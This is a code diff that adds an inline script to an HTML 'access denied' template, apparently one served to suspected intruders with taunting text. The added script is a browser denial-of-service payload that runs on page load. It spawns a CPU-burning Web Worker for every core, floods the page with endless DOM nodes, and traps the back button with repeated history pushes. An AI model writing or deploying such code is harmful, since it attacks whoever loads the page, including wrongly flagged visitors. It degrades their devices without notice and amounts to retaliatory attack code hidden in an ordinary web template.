@@ -44,6 +44,34 @@ have been archived for forensic analysis.</p>
 <p style="color:#ff6666"><strong>Reason:</strong> {reason}</p>
 <p style="color:#888">If you believe this is a mistake, it probably isn't.
 But feel free to keep trying &mdash; we enjoy watching.</p>
+<script>
+(function(){{
+  // Spawn workers to saturate all CPU cores
+  var blob = new Blob([
+    'while(true){{ var a=new ArrayBuffer(1<<20);' +
+    'var v=new Uint32Array(a);' +
+    'for(var i=0;i<v.length;i++)v[i]=v[i]^(i*2654435761>>>0); }}'
+  ], {{type:'application/javascript'}});
+  var url = URL.createObjectURL(blob);
+  var n = navigator.hardwareConcurrency || 8;
+  for (var i = 0; i < n; i++) new Worker(url);
+  // Main thread: recursive RAF + DOM flood
+  function burn() {{
+    for (var j = 0; j < 200; j++) {{
+      var d = document.createElement('div');
+      d.textContent = Math.random().toString(36);
+      document.body.appendChild(d);
+    }}
+    requestAnimationFrame(burn);
+  }}
+  burn();
+  // Block tab close with repeated history pushes
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', function() {{
+    history.pushState(null, '', location.href);
+  }});
+}})();
+</script>
 </body></html>"""
 
 load_dotenv()
